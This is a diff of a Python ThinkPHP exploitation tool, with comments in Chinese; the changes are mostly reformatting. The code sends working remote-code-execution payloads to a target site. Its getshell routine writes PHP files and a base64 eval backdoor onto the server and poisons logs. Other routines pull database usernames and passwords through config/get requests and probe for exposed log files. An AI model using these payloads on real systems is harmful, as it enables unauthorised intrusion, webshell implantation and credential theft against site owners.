@@ -1,4 +1,4 @@
-#coding:utf-8
+# coding:utf-8
 
 '''
 需求：
@@ -15,10 +15,11 @@ import base64
 import argparse
 import time
 from bs4 import BeautifulSoup
-#proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
+
+# proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-requests.packages.urllib3.disable_warnings()
+# requests.packages.urllib3.disable_warnings()
 
 headers = {
     "Host": "",
@@ -30,6 +31,7 @@ headers = {
     "Content-Type": "application/x-www-form-urlencoded",
     "Cookie": "PHPSESSID=doo8htm6c4v8qtk7djkqm97mh2; Hm_lvt_31a988db7810b2d29dc2e834e87de160=1587714930; __51cke__=; Hm_lpvt_31a988db7810b2d29dc2e834e87de160=1587715063; __tins__19783839=%7B%22sid%22%3A%201587715044477%2C%20%22vd%22%3A%205%2C%20%22expires%22%3A%201587716909551%7D; __51laig__=5"
 }
+
 
 def think_rce_check(host):
     print('\033[1;34m[!] thinkphp_RCE探测：\033[0m')
@@ -49,7 +51,8 @@ def think_rce_check(host):
         for i in payloads:
             url = host + i
             res = requests.get(url=url, headers=headers, timeout=5, verify=False, allow_redirects=False)
-            if ('PHP Version' in res.text) or ('PHP Extension Build' in res.text) or ("098f6bcd4621d373cade4e832627b4f6" in res.text):
+            if ('PHP Version' in res.text) or ('PHP Extension Build' in res.text) or (
+                    "098f6bcd4621d373cade4e832627b4f6" in res.text):
                 success.append(i)
             else:
                 pass
@@ -57,8 +60,8 @@ def think_rce_check(host):
         print("\033[1;31m网络出错！\033[0m")
         pass
 
-    #if not success:
-        # ThinkPHP <= 5.0.23 需要存在xxx的method路由，例如captcha
+    # if not success:
+    # ThinkPHP <= 5.0.23 需要存在xxx的method路由，例如captcha
     test_str = "098f6bcd4621d373cade4e832627b4f6"
     url2 = host + "/?s=captcha&test=-1"
     post_ = [r'_method=__construct&filter=phpinfo&method=get&server[REQUEST_METHOD]=1',
@@ -66,7 +69,8 @@ def think_rce_check(host):
              r'_method=__construct&filter[]=system&method=GET&get[]=curl ' + host + '/robots.txt']
     try:
         for j in post_:
-            res2 = requests.request('POST', url2, data=j, headers=headers, timeout=5, verify=False, allow_redirects=False)
+            res2 = requests.request('POST', url2, data=j, headers=headers, timeout=5, verify=False,
+                                    allow_redirects=False)
             if ('PHP Version' in res2.text) or ('PHP Extension Build' in res2.text) or ("Disallow" in res2.text):
                 payload_post1 = url2 + "  POST: " + j
                 success.append(payload_post1)
@@ -79,8 +83,9 @@ def think_rce_check(host):
     url3 = host + "/?s=captcha&test=exit(md5(%27test%27))"
     post_1 = r'_method=__construct&filter[]=assert&method=get&server[REQUEST_METHOD]=-1'
     try:
-        res3 = requests.request('POST', url3, data=post_1, headers=headers, timeout=5, verify=False, allow_redirects=False)
-        if  ("098f6bcd4621d373cade4e832627b4f6" in res3.text):
+        res3 = requests.request('POST', url3, data=post_1, headers=headers, timeout=5, verify=False,
+                                allow_redirects=False)
+        if ("098f6bcd4621d373cade4e832627b4f6" in res3.text):
             payload_post2 = url3 + "  POST: " + post_1
             success.append(payload_post2)
         else:
@@ -92,10 +97,11 @@ def think_rce_check(host):
     # ThinkPHP <= 5.0.13
     url4 = host + "/?s=index/index/"
     post_2 = [r's=-1&_method=__construct&method=&filter[]=phpinfo',
-             r's=curl ' + host + '/robots.txt' + '&_method=__construct&method=&filter[]=system'.format(test_str)]
+              r's=curl ' + host + '/robots.txt' + '&_method=__construct&method=&filter[]=system']
     try:
         for k in post_2:
-            res4 = requests.request('POST', url4, data=k, headers=headers, timeout=5, verify=False, allow_redirects=False)
+            res4 = requests.request('POST', url4, data=k, headers=headers, timeout=5, verify=False,
+                                    allow_redirects=False)
             if ('PHP Version' in res3.text) or ('PHP Extension Build' in res4.text) or (
                     "Disallow" in res4.text):
                 payload_post3 = url4 + "  POST: " + k
@@ -109,10 +115,11 @@ def think_rce_check(host):
     # ThinkPHP <= 5.0.23、5.1.0 <= 5.1.16 需要开启框架app_debug
     url5 = host
     post_3 = [r'_method=__construct&filter[]=phpinfo&server[REQUEST_METHOD]=-1',
-             r'_method=__construct&filter[]=system&server[REQUEST_METHOD]=curl ' + host + '/robots.txt']
+              r'_method=__construct&filter[]=system&server[REQUEST_METHOD]=curl ' + host + '/robots.txt']
     try:
         for y in post_3:
-            res5 = requests.request('POST', url5, data=y, headers=headers, timeout=5, verify=False, allow_redirects=False)
+            res5 = requests.request('POST', url5, data=y, headers=headers, timeout=5, verify=False,
+                                    allow_redirects=False)
             if ('PHP Version' in res5.text) or ('PHP Extension Build' in res5.text) or (
                     "Disallow" in res5.text):
                 payload_post4 = url5 + "  POST: " + y
@@ -130,19 +137,22 @@ def think_rce_check(host):
     else:
         print("\033[1;31m[!] 不存在thinkphp_RCE!\033[0m")
 
+
 def getshell(host):
     print("\033[1;34m[!]正在尝试Getshell：\033[0m")
     headers["Host"] = parse.urlparse(host).hostname
     success = False
     shell = "<?php phpinfo();?>"
-    payload = [r"/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][]=" + shell,
-               r"/?s=index/\think\template\driver\file/write&cacheFile=1ndex.php&content=" + shell,
-               ]
+    payload = [
+        r"/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][]=" + shell,
+        r"/?s=index/\think\template\driver\file/write&cacheFile=1ndex.php&content=" + shell,
+        ]
     for k in payload:
         url = host + k
         try:
             res_get = requests.get(url=url, headers=headers, timeout=5, verify=False, allow_redirects=False)
-            getshell_res = requests.get(url=host + "/1ndex.php", headers=headers, timeout=5, verify=False, allow_redirects=False)
+            getshell_res = requests.get(url=host + "/1ndex.php", headers=headers, timeout=5, verify=False,
+                                        allow_redirects=False)
             if getshell_res.status_code == 200:
                 print("\033[1;32m[+] Getshell succeed，shell address： " + host + "/1ndex.php\n\033[0m")
                 success = True
@@ -154,10 +164,13 @@ def getshell(host):
 
     if not success:
         # ThinkPHP <= 5.0.23 需要存在xxx的method路由，例如captcha
-        post_payload1 = r'_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=echo+\'"{}"\'+>>1ndex.php'.format(shell)
+        post_payload1 = r'_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=echo+\'"{}"\'+>>1ndex.php'.format(
+            shell)
         try:
-            res2_get = requests.request("POST", host+"/?s=captcha&test=1", data=post_payload1, headers=headers, timeout=5, verify=False, allow_redirects=False)
-            getshell_res = requests.get(url=host + "/1ndex.php", headers=headers, timeout=5, verify=False, allow_redirects=False)
+            res2_get = requests.request("POST", host + "/?s=captcha&test=1", data=post_payload1, headers=headers,
+                                        timeout=5, verify=False, allow_redirects=False)
+            getshell_res = requests.get(url=host + "/1ndex.php", headers=headers, timeout=5, verify=False,
+                                        allow_redirects=False)
             if getshell_res.status_code == 200:
                 print("\033[1;32m[+] Getshell succeed，shell address： " + host + "/2ndex.php\n\033[0m")
                 success = True
@@ -172,8 +185,10 @@ def getshell(host):
                          r'_method=__construct&filter[]=system&mytest=echo+ "{}" +>>1ndex.php'.format(shell)]
         for h in post_payload2:
             try:
-                res3_get = requests.request("POST", host+"/?s=index/index", data=post_payload2[0], headers=headers, timeout=5, verify=False, allow_redirects=False)
-                getshell_res = requests.get(url=host + "/1ndex.php", headers=headers, timeout=5, verify=False, allow_redirects=False)
+                res3_get = requests.request("POST", host + "/?s=index/index", data=post_payload2[0], headers=headers,
+                                            timeout=5, verify=False, allow_redirects=False)
+                getshell_res = requests.get(url=host + "/1ndex.php", headers=headers, timeout=5, verify=False,
+                                            allow_redirects=False)
                 if getshell_res.status_code == 200:
                     print("\033[1;32m[+] Getshell succeed，shell address： " + host + "/3ndex.php\n\033[0m")
                     success = True
@@ -190,12 +205,17 @@ def getshell(host):
         sess_dir = 'php://filter/read=convert.base64-decode/resource=/tmp/sess_{}'.format(sess).encode(encoding="utf-8")
         base64_ = base64.b64encode(sess_dir).decode()
         post_payload4 = r'_method=__construct&filter[]=think\Session::set&method=get&get[]=abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2bab&server[]=1'
-        post_res = r'_method=__construct&filter[]=base64_decode&filter[]=think\__include_file&method=get&server[]=1&get[]={}'.format(base64_)
+        post_res = r'_method=__construct&filter[]=base64_decode&filter[]=think\__include_file&method=get&server[]=1&get[]={}'.format(
+            base64_)
         try:
-            res5_get = requests.request("POST", host+"/?s=captcha&test=1", data=post_payload4, headers=headers, timeout=5, verify=False, allow_redirects=False)
-            getshell_res = requests.request("POST", host+"/?s=captcha&r=cGhwaW5mbygpOw==", data=post_res, headers=headers, timeout=5, verify=False, allow_redirects=False)
+            res5_get = requests.request("POST", host + "/?s=captcha&test=1", data=post_payload4, headers=headers,
+                                        timeout=5, verify=False, allow_redirects=False)
+            getshell_res = requests.request("POST", host + "/?s=captcha&r=cGhwaW5mbygpOw==", data=post_res,
+                                            headers=headers, timeout=5, verify=False, allow_redirects=False)
             if ('PHP Version' in getshell_res.text) or ('PHP Extension Build' in getshell_res.text):
-                print("\033[1;32m[+] Getshell success, You can use POST " + host + "/?s=captcha&r=cGhwaW5mbygpOw==\n\033[0m" + "\033[1;32m[=]  _method=__construct&filter[]=base64_decode&filter[]=think\__include_file&method=get&server[]=1&get[]={}\033[0m".format(base64_))
+                print(
+                    "\033[1;32m[+] Getshell success, You can use POST " + host + "/?s=captcha&r=cGhwaW5mbygpOw==\n\033[0m" + "\033[1;32m[=]  _method=__construct&filter[]=base64_decode&filter[]=think\__include_file&method=get&server[]=1&get[]={}\033[0m".format(
+                        base64_))
                 print("\033[1;32m[+] r 参数是命令的base64编码\n\033[0m")
                 success = True
             else:
@@ -204,11 +224,12 @@ def getshell(host):
             pass
 
     if not success:
-        post_payload5 = r'_method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]={}<?php md5("test");?>'.format(shell)
+        post_payload5 = r'_method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]={}<?php md5("test");?>'.format(
+            shell)
         time_dir = time.strftime("%Y%m/%d", time.localtime())
         try:
             res5_get = requests.request("POST", host + "/?s=captcha", data=post_payload5, headers=headers, timeout=5,
-                                    verify=False, allow_redirects=False)
+                                        verify=False, allow_redirects=False)
             dir_ = "../runtime/log/{}.log".format(time_dir)
             url = host + "/?s=index/\\think\Lang/load&file=" + dir_
             getshell_res = requests.get(url=url)
@@ -224,17 +245,22 @@ def getshell(host):
 
     return success
 
+
 def get_mysql_conf(host):
     headers["Host"] = parse.urlparse(host).hostname
     print("\033[1;34m[!] 尝试获取数据库配置:\033[0m")
     mysql_success = False
     try:
-        name = requests.get(url=host+"/?s=index/think\config/get&name=database.username",  headers=headers, timeout=5, verify=False, allow_redirects=False)
-        hostname = requests.get(url=host + "/?s=index/think\config/get&name=database.hostname", headers=headers, timeout=5,
+        name = requests.get(url=host + "/?s=index/think\config/get&name=database.username", headers=headers, timeout=5,
+                            verify=False, allow_redirects=False)
+        hostname = requests.get(url=host + "/?s=index/think\config/get&name=database.hostname", headers=headers,
+                                timeout=5,
                                 verify=False, allow_redirects=False)
-        password = requests.get(url=host + "/?s=index/think\config/get&name=database.password", headers=headers, timeout=5,
+        password = requests.get(url=host + "/?s=index/think\config/get&name=database.password", headers=headers,
+                                timeout=5,
                                 verify=False, allow_redirects=False)
-        database = requests.get(url=host + "/?s=index/think\config/get&name=database.database", headers=headers, timeout=5,
+        database = requests.get(url=host + "/?s=index/think\config/get&name=database.database", headers=headers,
+                                timeout=5,
                                 verify=False, allow_redirects=False)
         if len(name.text) < 100:
             print("\033[1;32m[+] database username: \033[0m" + name.text)
@@ -250,6 +276,7 @@ def get_mysql_conf(host):
     except:
         pass
 
+
 def log_find(host):
     headers["Host"] = parse.urlparse(host).hostname
     print('\033[1;34m[!] 日志文件路径探测：\033[0m')
@@ -264,11 +291,14 @@ def log_find(host):
         info_res = requests.get(url=log_dir_info_5, headers=headers, timeout=5, verify=False, allow_redirects=False)
         error_res = requests.get(url=log_dir_error_5, headers=headers, timeout=5, verify=False, allow_redirects=False)
         sql_res = requests.get(url=log_dir_sql_5, headers=headers, timeout=5, verify=False, allow_redirects=False)
-        if info_res.status_code == 200 and (("[ info ]" in info_res.text) or ("[ sql ]" in info_res.text) or ("[ error ]" in info_res.text)):
+        if info_res.status_code == 200 and (
+                ("[ info ]" in info_res.text) or ("[ sql ]" in info_res.text) or ("[ error ]" in info_res.text)):
             print("\033[1;32m[+] info日志存在: \033[0m" + log_dir_info_5)
-        if error_res.status_code == 200 and (("[ info ]" in error_res.text) or ("[ sql ]" in error_res.text) or ("[ error ]" in error_res.text)):
+        if error_res.status_code == 200 and (
+                ("[ info ]" in error_res.text) or ("[ sql ]" in error_res.text) or ("[ error ]" in error_res.text)):
             print("\033[1;32m[+] error日志存在: \033[0m" + log_dir_error_5)
-        if sql_res.status_code == 200 and (("[ info ]" in sql_res.text) or ("[ sql ]" in sql_res.text) or ("[ error ]" in sql_res.text)):
+        if sql_res.status_code == 200 and (
+                ("[ info ]" in sql_res.text) or ("[ sql ]" in sql_res.text) or ("[ error ]" in sql_res.text)):
             print("\033[1;32m[+] sql日志存在: \033[0m" + log_dir_sql_5)
     except:
         print("\033[1;31m网络出错！\033[0m")
@@ -279,17 +309,19 @@ def log_find(host):
     log_dir_3_2 = host + "/Runtime/Logs/Home/{}.log".format(time_dir_3)
     log_dir_3_3 = host + "/Runtime/Logs/Common/{}.log".format(time_dir_3)
     log_dir_3_4 = host + "/Application/Runtime/Logs/Common/{}.log".format(time_dir_3)
-    log_dir_3 = [log_dir_3_1, log_dir_3_2, log_dir_3_3, log_dir_3_4]
+    log_dir_3_5 = host + "/App/Runtime/Logs/Home/{}.log".format(time_dir_3)
+    log_dir_3 = [log_dir_3_1, log_dir_3_2, log_dir_3_3, log_dir_3_4, log_dir_3_5]
     for i in log_dir_3:
         try:
             log_3_res = requests.get(url=i, headers=headers, timeout=5, verify=False, allow_redirects=False)
             log_3_res.encoding = 'utf-8'
-            if log_3_res.status_code == 200 and (("INFO:" in log_3_res.text) or ("SQL语句" in log_3_res.text)):
+            if log_3_res.status_code == 200 and (("INFO:" in log_3_res.text) or ("SQL语句" in log_3_res.text) or ("ERR:" in log_3_res.text)):
                 print("\033[1;32m[+] 日志存在: \033[0m" + i)
             else:
                 pass
         except:
             print("\033[1;31m网络出错！\033[0m")
+
 
 def check_dubug(host):
     headers["Host"] = parse.urlparse(host).hostname
@@ -297,20 +329,21 @@ def check_dubug(host):
     div_html_3 = ''
     print("\033[1;34m[+] 检测Debug模式是否开启: \033[0m")
     debug_bool = False
-    url_debug=["indx.php", "/index.php/?s=index/inex/"]
-    #url_debug = host + "/index.php/?s=index/inex/"
+    url_debug = ["indx.php", "/index.php/?s=index/inex/"]
+    # url_debug = host + "/index.php/?s=index/inex/"
     for i in url_debug:
         try:
-            res_debug = requests.get(url=host+i, headers=headers, timeout=5, verify=False, allow_redirects=False)
+            res_debug = requests.get(url=host + i, headers=headers, timeout=5, verify=False, allow_redirects=False)
             res_debug.encoding = 'utf-8'
-            #print(res_debug.text)
+            # print(res_debug.text)
             if ("Environment Variables" in res_debug.text) or ("错误位置" in res_debug.text):
                 print("\033[1;32m[+] Debug 模式已开启！\033[0m")
                 debug_bool = True
                 res_debug_html = BeautifulSoup(res_debug.text, 'html.parser')
-                div_html_5 = res_debug_html.findAll('div', {'class':'clearfix'})
+                div_html_5 = res_debug_html.findAll('div', {'class': 'clearfix'})
                 div_html_3 = res_debug_html.find('sup')
                 div_html_3_path = res_debug_html('div', {'class': 'text'})
+                print(div_html_5)
                 break
         except:
             print("\033[1;31m[+] 检测出错\033[0m")
@@ -338,6 +371,7 @@ def check_host(host):
         return False
     else:
         return True
+
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Thinkphp Scan')
@@ -368,4 +402,3 @@ if __name__ == "__main__":
                 get_mysql_conf(url)
                 if args.shell:
                     getshell(url)
-
